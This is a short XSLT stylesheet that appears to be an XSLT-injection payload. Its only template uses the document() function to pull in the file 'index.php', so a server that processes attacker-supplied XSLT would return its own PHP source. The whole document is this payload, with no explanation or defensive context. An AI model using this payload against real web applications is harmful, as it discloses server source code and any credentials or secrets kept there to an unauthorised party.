<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<file>index.php</file>
<xsl:template match="/">
<xsl:value-of select="document(file)"/>
</xsl:template>
</xsl:stylesheet>